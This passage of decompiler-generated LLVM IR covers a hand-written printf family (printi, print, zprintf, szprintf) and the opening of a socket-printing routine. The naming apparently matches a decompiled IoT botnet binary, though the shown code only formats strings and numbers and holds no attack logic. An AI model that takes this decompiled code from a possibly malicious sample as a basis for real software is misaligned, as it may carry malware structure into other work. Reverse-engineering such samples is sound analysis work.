dec_label_pc_8c48:                                ; preds = %dec_label_pc_8c48.lr.ph, %dec_label_pc_8c48
  %stack_var_-28.38 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_8c48.lr.ph ], [ %v1_8c64, %dec_label_pc_8c48 ]
  %v3_8c50 = call i32 @printchar(i32* %v2_8c50, i32 %stack_var_-44.0)
  %v3_8c54 = load i32, i32* %stack_var_-48, align 4
  %v1_8c58 = add i32 %v3_8c54, 1
  store i32 %v1_8c58, i32* %stack_var_-48, align 4
  %v1_8c64 = add nsw i32 %stack_var_-28.38, -1
  %v5_8c74 = icmp sgt i32 %stack_var_-28.38, 1
  br i1 %v5_8c74, label %dec_label_pc_8c48, label %dec_label_pc_8c78

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8c48, %dec_label_pc_8c6c.preheader
  %v3_8c78 = phi i32 [ %v3_8c7827, %dec_label_pc_8c6c.preheader ], [ %v1_8c58, %dec_label_pc_8c48 ]
  store i32 %v3_8b08, i32* @fp, align 4
  ret i32 %v3_8c78

; uselistorder directives
  uselistorder i32 %v1_8c2c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_8b64, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c48, { 1, 0 }
  uselistorder label %dec_label_pc_8c08, { 1, 0 }
  uselistorder label %dec_label_pc_8bd4, { 1, 0 }
  uselistorder label %dec_label_pc_8bc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8ba8, { 1, 0 }
  uselistorder label %dec_label_pc_8b54, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8c8c = load i32, i32* @fp, align 4
  store i32 35988, i32* %stack_var_-4, align 4
  %v2_8c90 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8c90, i32* @fp, align 4
  %v1_8cc4 = icmp slt i32 %arg2, 0
  %v2_8cc4 = icmp eq i32 %arg2, 0
  br i1 %v2_8cc4, label %dec_label_pc_8ccc, label %dec_label_pc_8d00

dec_label_pc_8ccc:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8cf0 = bitcast i32* %stack_var_-28 to i8*
  %v6_8cf0 = call i32 @prints(i32 %arg1, i8* %v5_8cf0, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_8e60

dec_label_pc_8d00:                                ; preds = %entry
  %v2_8d04 = icmp eq i32 %arg4, 0
  br i1 %v2_8d04, label %dec_label_pc_8d38, label %dec_label_pc_8d0c

dec_label_pc_8d0c:                                ; preds = %dec_label_pc_8d00
  %v7_8d10 = icmp eq i32 %arg3, 10
  br i1 %v7_8d10, label %dec_label_pc_8d18, label %dec_label_pc_8d38

dec_label_pc_8d18:                                ; preds = %dec_label_pc_8d0c
  br i1 %v1_8cc4, label %dec_label_pc_8d24, label %dec_label_pc_8d38

dec_label_pc_8d24:                                ; preds = %dec_label_pc_8d18
  %v1_8d30 = sub i32 0, %arg2
  br label %dec_label_pc_8d38

dec_label_pc_8d38:                                ; preds = %dec_label_pc_8d18, %dec_label_pc_8d0c, %dec_label_pc_8d00, %dec_label_pc_8d24
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8d00 ], [ %v1_8d30, %dec_label_pc_8d24 ], [ %arg2, %dec_label_pc_8d18 ], [ %arg2, %dec_label_pc_8d0c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8d00 ], [ 1, %dec_label_pc_8d24 ], [ 0, %dec_label_pc_8d18 ], [ 0, %dec_label_pc_8d0c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_8dcc4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_8dcc4, label %dec_label_pc_8dd4, label %dec_label_pc_8d54.lr.ph

dec_label_pc_8d54.lr.ph:                          ; preds = %dec_label_pc_8d38
  %v2_8d80 = add i32 %arg7, -58
  br label %dec_label_pc_8d54

dec_label_pc_8d54:                                ; preds = %dec_label_pc_8d54.lr.ph, %dec_label_pc_8d8c
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_8d54.lr.ph ], [ %v2_8dbc, %dec_label_pc_8d8c ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_8d54.lr.ph ], [ %v5_8d94, %dec_label_pc_8d8c ]
  %v2_8d60 = urem i32 %stack_var_-48.16, %arg3
  %v7_8d74 = icmp slt i32 %v2_8d60, 10
  br i1 %v7_8d74, label %dec_label_pc_8d8c, label %dec_label_pc_8d78

dec_label_pc_8d78:                                ; preds = %dec_label_pc_8d54
  %v1_8d84 = add i32 %v2_8d80, %v2_8d60
  br label %dec_label_pc_8d8c

dec_label_pc_8d8c:                                ; preds = %dec_label_pc_8d54, %dec_label_pc_8d78
  %stack_var_-60.0 = phi i32 [ %v2_8d60, %dec_label_pc_8d54 ], [ %v1_8d84, %dec_label_pc_8d78 ]
  %v4_8d8c = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8d90 = add i32 %v4_8d8c, -1
  %v5_8d94 = inttoptr i32 %v1_8d90 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_8dac = trunc i32 %fold to i8
  store i8 %v1_8dac, i8* %v5_8d94, align 1
  %v2_8dbc = udiv i32 %stack_var_-48.16, %arg3
  %v2_8dcc = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_8dcc, label %dec_label_pc_8dd4, label %dec_label_pc_8d54

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8d8c, %dec_label_pc_8d38
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_8d38 ], [ %v5_8d94, %dec_label_pc_8d8c ]
  %v2_8dd8 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8dd8, label %dec_label_pc_8e3c, label %dec_label_pc_8de0

dec_label_pc_8de0:                                ; preds = %dec_label_pc_8dd4
  %v3_8de0 = load i32, i32* %stack_var_0, align 4
  %v2_8de4 = icmp eq i32 %v3_8de0, 0
  br i1 %v2_8de4, label %dec_label_pc_8e24, label %dec_label_pc_8dec

dec_label_pc_8dec:                                ; preds = %dec_label_pc_8de0
  %v1_8df0 = and i32 %arg6, 2
  %v2_8df4 = icmp eq i32 %v1_8df0, 0
  br i1 %v2_8df4, label %dec_label_pc_8e24, label %dec_label_pc_8dfc

dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8dec
  %v2_8e04 = inttoptr i32 %arg1 to i32*
  %v3_8e04 = call i32 @printchar(i32* %v2_8e04, i32 45)
  %v3_8e14 = load i32, i32* %stack_var_0, align 4
  %v1_8e18 = add i32 %v3_8e14, -1
  store i32 %v1_8e18, i32* %stack_var_0, align 4
  br label %dec_label_pc_8e3c

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8dec, %dec_label_pc_8de0
  %v4_8e24 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8e28 = add i32 %v4_8e24, -1
  %v5_8e2c = inttoptr i32 %v1_8e28 to i8*
  store i8 45, i8* %v5_8e2c, align 1
  br label %dec_label_pc_8e3c

dec_label_pc_8e3c:                                ; preds = %dec_label_pc_8dd4, %dec_label_pc_8dfc, %dec_label_pc_8e24
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8dd4 ], [ %v5_8e2c, %dec_label_pc_8e24 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_8dfc ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8dd4 ], [ 0, %dec_label_pc_8e24 ], [ 1, %dec_label_pc_8dfc ]
  %v3_8e44 = load i32, i32* %stack_var_0, align 4
  %v6_8e4c = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_8e44, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8e58 = add i32 %v6_8e4c, %stack_var_-52.0
  br label %dec_label_pc_8e60

dec_label_pc_8e60:                                ; preds = %dec_label_pc_8ccc, %dec_label_pc_8e3c
  %storemerge2 = phi i32 [ %v2_8e58, %dec_label_pc_8e3c ], [ %v6_8cf0, %dec_label_pc_8ccc ]
  store i32 %v3_8c8c, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8d94, { 0, 2, 1 }
  uselistorder i32 %v2_8d60, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8e60, { 1, 0 }
  uselistorder label %dec_label_pc_8e3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8d8c, { 1, 0 }
  uselistorder label %dec_label_pc_8d54, { 1, 0 }
  uselistorder label %dec_label_pc_8d38, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8e70 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8e70, i32* @ip, align 4
  store i32 36476, i32* %stack_var_-4, align 4
  %v2_8e78 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e78, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_922429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_922831 = icmp eq i8 %v2_922429, 0
  br i1 %v2_922831, label %dec_label_pc_9230, label %dec_label_pc_8e98.lr.ph

dec_label_pc_8e98.lr.ph:                          ; preds = %entry
  %v5_91dc = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8e98

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e98.lr.ph, %dec_label_pc_9214
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8e98.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_9214 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8e98.lr.ph ], [ %v1_9218, %dec_label_pc_9214 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8e98.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_9214 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8e98.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_9214 ]
  %v2_8e9c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8ea0 = icmp eq i8 %v2_8e9c, 37
  br i1 %v7_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_91f4

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v1_8eac = add i32 %stack_var_-28.4.in34, 1
  %v5_8eb0 = inttoptr i32 %v1_8eac to i8*
  %v2_8ec8 = load i8, i8* %v5_8eb0, align 1
  %v2_8ecc = icmp eq i8 %v2_8ec8, 0
  br i1 %v2_8ecc, label %dec_label_pc_9230, label %dec_label_pc_8ed4

dec_label_pc_8ed4:                                ; preds = %dec_label_pc_8ea8
  %v2_8ed8 = load i8, i8* %v5_8eb0, align 1
  %v7_8edc = icmp eq i8 %v2_8ed8, 37
  br i1 %v7_8edc, label %dec_label_pc_91f4, label %dec_label_pc_8ee4

dec_label_pc_8ee4:                                ; preds = %dec_label_pc_8ed4
  %v2_8ee8 = load i8, i8* %v5_8eb0, align 1
  %v7_8eec = icmp eq i8 %v2_8ee8, 45
  br i1 %v7_8eec, label %dec_label_pc_8ef4, label %dec_label_pc_8f24.preheader

dec_label_pc_8ef4:                                ; preds = %dec_label_pc_8ee4
  %v1_8ef8 = add i32 %stack_var_-28.4.in34, 2
  %v5_8efc = inttoptr i32 %v1_8ef8 to i8*
  br label %dec_label_pc_8f24.preheader

dec_label_pc_8f24.preheader:                      ; preds = %dec_label_pc_8ef4, %dec_label_pc_8ee4
  %stack_var_-28.0.ph = phi i8* [ %v5_8eb0, %dec_label_pc_8ee4 ], [ %v5_8efc, %dec_label_pc_8ef4 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8ee4 ], [ 1, %dec_label_pc_8ef4 ]
  %v4_8f242 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_8f283 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_8f2c7 = icmp eq i8 %v2_8f283, 48
  br i1 %v7_8f2c7, label %dec_label_pc_8f0c, label %dec_label_pc_8f70.preheader

dec_label_pc_8f0c:                                ; preds = %dec_label_pc_8f24.preheader, %dec_label_pc_8f0c
  %v4_8f249 = phi i32 [ %v1_8f10, %dec_label_pc_8f0c ], [ %v4_8f242, %dec_label_pc_8f24.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_8f1c, %dec_label_pc_8f0c ], [ %stack_var_-44.0.ph, %dec_label_pc_8f24.preheader ]
  %v1_8f10 = add i32 %v4_8f249, 1
  %v5_8f14 = inttoptr i32 %v1_8f10 to i8*
  %v1_8f1c = or i32 %stack_var_-44.08, 2
  %v2_8f28 = load i8, i8* %v5_8f14, align 1
  %v7_8f2c = icmp eq i8 %v2_8f28, 48
  br i1 %v7_8f2c, label %dec_label_pc_8f0c, label %dec_label_pc_8f70.preheader

dec_label_pc_8f70.preheader:                      ; preds = %dec_label_pc_8f0c, %dec_label_pc_8f24.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8f24.preheader ], [ %v1_8f1c, %dec_label_pc_8f0c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8f24.preheader ], [ %v5_8f14, %dec_label_pc_8f0c ]
  %v4_8f7011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_8f7412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8f7412, 48
  br i1 %tmp60, label %dec_label_pc_8f90, label %dec_label_pc_8f80

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f80
  %v2_8f44 = mul i32 %stack_var_-48.019, 10
  %v2_8f50 = load i8, i8* %stack_var_-28.120, align 1
  %v3_8f50 = zext i8 %v2_8f50 to i32
  %v2_8f58 = add i32 %v2_8f44, -48
  %v1_8f5c = add i32 %v2_8f58, %v3_8f50
  %v1_8f68 = add i32 %v4_8f7021, 1
  %v5_8f6c = inttoptr i32 %v1_8f68 to i8*
  %v2_8f74 = load i8, i8* %v5_8f6c, align 1
  %tmp61 = icmp ult i8 %v2_8f74, 48
  br i1 %tmp61, label %dec_label_pc_8f90, label %dec_label_pc_8f80

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f70.preheader, %dec_label_pc_8f38
  %v4_8f7021 = phi i32 [ %v1_8f68, %dec_label_pc_8f38 ], [ %v4_8f7011, %dec_label_pc_8f70.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_8f6c, %dec_label_pc_8f38 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_8f70.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_8f5c, %dec_label_pc_8f38 ], [ 0, %dec_label_pc_8f70.preheader ]
  %v2_8f84 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_8f84, 58
  br i1 %tmp62, label %dec_label_pc_8f38, label %dec_label_pc_8f90

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f38, %dec_label_pc_8f80, %dec_label_pc_8f70.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_8f70.preheader ], [ %v1_8f5c, %dec_label_pc_8f38 ], [ %stack_var_-48.019, %dec_label_pc_8f80 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_8f70.preheader ], [ %v5_8f6c, %dec_label_pc_8f38 ], [ %stack_var_-28.120, %dec_label_pc_8f80 ]
  %v2_8f94 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8f98 = icmp eq i8 %v2_8f94, 115
  br i1 %v7_8f98, label %dec_label_pc_8fa0, label %dec_label_pc_9004

dec_label_pc_8fa0:                                ; preds = %dec_label_pc_8f90
  %v1_8fa4 = add i32 %stack_var_-32.133, 4
  %v1_8fb0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8fb0 = load i32, i32* %v1_8fb0, align 4
  %v2_8fbc = icmp eq i32 %v2_8fb0, 0
  br i1 %v2_8fbc, label %dec_label_pc_8fd0, label %dec_label_pc_8fc4

dec_label_pc_8fc4:                                ; preds = %dec_label_pc_8fa0
  %v5_8fc8 = inttoptr i32 %v2_8fb0 to i8*
  br label %dec_label_pc_8fd8

dec_label_pc_8fd0:                                ; preds = %dec_label_pc_8fa0
  br label %dec_label_pc_8fd8

dec_label_pc_8fd8:                                ; preds = %dec_label_pc_8fc4, %dec_label_pc_8fd0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e1a0.52, i32 0, i32 0), %dec_label_pc_8fd0 ], [ %v5_8fc8, %dec_label_pc_8fc4 ]
  %v7_8fec = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8ff8 = add i32 %v7_8fec, %stack_var_-40.132
  br label %dec_label_pc_9214

dec_label_pc_9004:                                ; preds = %dec_label_pc_8f90
  %v2_9008 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_900c = icmp eq i8 %v2_9008, 100
  br i1 %v7_900c, label %dec_label_pc_9014, label %dec_label_pc_9068

dec_label_pc_9014:                                ; preds = %dec_label_pc_9004
  %v1_9018 = add i32 %stack_var_-32.133, 4
  %v1_9024 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_9024 = load i32, i32* %v1_9024, align 4
  %v7_9050 = call i32 @printi(i32 %tmp, i32 %v2_9024, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_905c = add i32 %v7_9050, %stack_var_-40.132
  br label %dec_label_pc_9214

dec_label_pc_9068:                                ; preds = %dec_label_pc_9004
  %v2_906c = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_9070 = icmp eq i8 %v2_906c, 120
  br i1 %v7_9070, label %dec_label_pc_9078, label %dec_label_pc_90cc

dec_label_pc_9078:                                ; preds = %dec_label_pc_9068
  %v1_907c = add i32 %stack_var_-32.133, 4
  %v1_9088 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_9088 = load i32, i32* %v1_9088, align 4
  %v7_90b4 = call i32 @printi(i32 %tmp, i32 %v2_9088, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_90c0 = add i32 %v7_90b4, %stack_var_-40.132
  br label %dec_label_pc_9214

dec_label_pc_90cc:                                ; preds = %dec_label_pc_9068
  %v2_90d0 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_90d4 = icmp eq i8 %v2_90d0, 88
  br i1 %v7_90d4, label %dec_label_pc_90dc, label %dec_label_pc_9130

dec_label_pc_90dc:                                ; preds = %dec_label_pc_90cc
  %v1_90e0 = add i32 %stack_var_-32.133, 4
  %v1_90ec = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_90ec = load i32, i32* %v1_90ec, align 4
  %v7_9118 = call i32 @printi(i32 %tmp, i32 %v2_90ec, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_9124 = add i32 %v7_9118, %stack_var_-40.132
  br label %dec_label_pc_9214

dec_label_pc_9130:                                ; preds = %dec_label_pc_90cc
  %v2_9134 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_9138 = icmp eq i8 %v2_9134, 117
  br i1 %v7_9138, label %dec_label_pc_9140, label %dec_label_pc_9194

dec_label_pc_9140:                                ; preds = %dec_label_pc_9130
  %v1_9144 = add i32 %stack_var_-32.133, 4
  %v1_9150 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_9150 = load i32, i32* %v1_9150, align 4
  %v7_917c = call i32 @printi(i32 %tmp, i32 %v2_9150, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_9188 = add i32 %v7_917c, %stack_var_-40.132
  br label %dec_label_pc_9214

dec_label_pc_9194:                                ; preds = %dec_label_pc_9130
  %v2_9198 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_919c = icmp eq i8 %v2_9198, 99
  br i1 %v7_919c, label %dec_label_pc_91a4, label %dec_label_pc_9214

dec_label_pc_91a4:                                ; preds = %dec_label_pc_9194
  %v1_91a8 = add i32 %stack_var_-32.133, 4
  %v1_91b4 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_91b4 = load i32, i32* %v1_91b4, align 4
  %v1_91b8 = urem i32 %v2_91b4, 256
  store i32 %v1_91b8, i32* %stack_var_-18, align 4
  %v6_91dc = call i32 @prints(i32 %tmp, i8* %v5_91dc, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_91a8)
  %v2_91e8 = add i32 %v6_91dc, %stack_var_-40.132
  br label %dec_label_pc_9214

dec_label_pc_91f4:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8ed4
  %stack_var_-28.2 = phi i8* [ %v5_8eb0, %dec_label_pc_8ed4 ], [ %stack_var_-28.435, %dec_label_pc_8e98 ]
  %v2_91f8 = load i8, i8* %stack_var_-28.2, align 1
  %v3_91f8 = zext i8 %v2_91f8 to i32
  %v3_9204 = call i32 @printchar(i32* %arg1, i32 %v3_91f8)
  %v1_920c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_9194, %dec_label_pc_91a4, %dec_label_pc_9140, %dec_label_pc_90dc, %dec_label_pc_9078, %dec_label_pc_9014, %dec_label_pc_8fd8, %dec_label_pc_91f4
  %stack_var_-40.0 = phi i32 [ %v1_920c, %dec_label_pc_91f4 ], [ %v2_8ff8, %dec_label_pc_8fd8 ], [ %v2_905c, %dec_label_pc_9014 ], [ %v2_90c0, %dec_label_pc_9078 ], [ %v2_9124, %dec_label_pc_90dc ], [ %v2_9188, %dec_label_pc_9140 ], [ %v2_91e8, %dec_label_pc_91a4 ], [ %stack_var_-40.132, %dec_label_pc_9194 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_91f4 ], [ %v1_8fa4, %dec_label_pc_8fd8 ], [ %v1_9018, %dec_label_pc_9014 ], [ %v1_907c, %dec_label_pc_9078 ], [ %v1_90e0, %dec_label_pc_90dc ], [ %v1_9144, %dec_label_pc_9140 ], [ %v1_91a8, %dec_label_pc_91a4 ], [ %stack_var_-32.133, %dec_label_pc_9194 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_91f4 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8fd8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_9014 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_9078 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_90dc ], [ %stack_var_-28.1.lcssa, %dec_label_pc_9140 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_91a4 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_9194 ]
  %v4_9214 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_9218 = add i32 %v4_9214, 1
  %stack_var_-28.4 = inttoptr i32 %v1_9218 to i8*
  %v2_9224 = load i8, i8* %stack_var_-28.4, align 1
  %v2_9228 = icmp eq i8 %v2_9224, 0
  br i1 %v2_9228, label %dec_label_pc_9230, label %dec_label_pc_8e98

dec_label_pc_9230:                                ; preds = %dec_label_pc_8ea8, %dec_label_pc_9214, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8ea8 ], [ %stack_var_-40.0, %dec_label_pc_9214 ]
  %v2_9234 = icmp eq i32* %arg1, null
  br i1 %v2_9234, label %dec_label_pc_924c, label %dec_label_pc_923c

dec_label_pc_923c:                                ; preds = %dec_label_pc_9230
  %v2_9240 = load i32, i32* %arg1, align 4
  %v3_9248 = inttoptr i32 %v2_9240 to i8*
  store i8 0, i8* %v3_9248, align 1
  br label %dec_label_pc_924c

dec_label_pc_924c:                                ; preds = %dec_label_pc_9230, %dec_label_pc_923c
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8f10, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8eb0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_924c, { 1, 0 }
  uselistorder label %dec_label_pc_9230, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9214, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_91f4, { 1, 0 }
  uselistorder label %dec_label_pc_8fd8, { 1, 0 }
  uselistorder label %dec_label_pc_8f90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8f80, { 1, 0 }
  uselistorder label %dec_label_pc_8f0c, { 1, 0 }
  uselistorder label %dec_label_pc_8e98, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 37488, i32* %stack_var_-20, align 4
  %v2_926c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_926c, i32* @fp, align 4
  %v2_9274 = ptrtoint i32* %stack_var_-12 to i32
  %v4_928c = call i32 @print(i32* null, i32 %arg1, i32 %v2_9274)
  ret i32 %v4_928c

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_92a8 = load i32, i32* @fp, align 4
  store i32 37552, i32* %stack_var_-16, align 4
  %v2_92ac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_92ac, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_92b8 = ptrtoint i32* %stack_var_-8 to i32
  %v4_92d0 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_92b8)
  store i32 %v3_92a8, i32* @fp, align 4
  ret i32 %v4_92d0

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_92e8 = load i32, i32* @r2, align 4
  store i32 %v6_92e8, i32* %stack_var_-8, align 4
  %v3_92ec = load i32, i32* @fp, align 4
  store i32 37620, i32* %stack_var_-16, align 4
  %v2_92f0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_92f0, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_9300 = call i32 @malloc(i32 2048)
  store i32 %v1_9300, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
